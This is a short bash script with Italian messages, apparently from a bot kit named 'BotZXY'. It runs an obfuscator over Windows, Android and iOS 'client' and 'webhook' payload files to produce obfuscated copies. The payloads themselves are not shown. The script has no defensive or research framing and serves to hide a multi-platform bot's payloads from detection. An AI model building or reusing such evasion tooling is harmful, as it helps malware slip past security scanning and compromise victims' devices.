#!/bin/bash
# BotZXY - Obfusca tutti i payload

echo "========================================"
echo "   BotZXY - Obfuscate Payloads"
echo "========================================"

# Verifica che obfuscator.py esista
if [ ! -f "obfuscator.py" ]; then
    echo "[ERRORE] obfuscator.py non trovato!"
    exit 1
fi

# Offusca Windows
echo ""
echo "[1/3] Offuscamento Windows..."
python3 obfuscator.py payloads/windows_client.py payloads/windows_client_obf.py

# Offusca Android
echo ""
echo "[2/3] Offuscamento Android..."
python3 obfuscator.py payloads/android_client.py payloads/android_client_obf.py

# Offusca iOS
echo ""
echo "[3/3] Offuscamento iOS..."
python3 obfuscator.py payloads/ios_webhook.py payloads/ios_webhook_obf.py

echo ""
echo "========================================"
echo "   Offuscamento completato!"
echo "   File generati:"
echo "   - payloads/windows_client_obf.py"
echo "   - payloads/android_client_obf.py"
echo "   - payloads/ios_webhook_obf.py"
echo "========================================"